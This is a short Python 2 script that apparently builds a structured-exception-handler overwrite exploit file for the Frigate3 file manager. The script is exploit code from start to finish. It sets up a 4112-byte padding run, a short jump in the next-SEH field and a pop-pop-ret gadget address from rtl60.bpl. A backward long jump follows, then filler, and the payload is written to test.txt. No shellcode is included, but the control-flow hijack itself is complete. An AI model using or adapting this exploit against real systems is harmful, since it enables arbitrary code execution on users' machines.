#!/usr/bin/python

import struct

filename = 'test.txt'

longJump = "\xE9\xE3\xEF\xFF\xFF"

nSeh = "\x74\x06\x75\x04" # NetJumping
Seh = "\x5f\x07\x01\x40"  # 0x4001075f : pop ecx # pop ebp # ret 0x04  - C:\Program Files\Frigate3\rtl60.bpl 

payload  = "A" * 4112
payload += nSeh
payload += Seh
payload += longJump
payload += "C" * 11
payload += "A" * 4 # start of Null bytes
payload += "D" * (7000 - len(payload))

print "[+] Creating file %s" % filename
with open(filename, 'w') as f:
    f.write(payload)
print "    File created, wrote %d bytes to file" % len(payload)

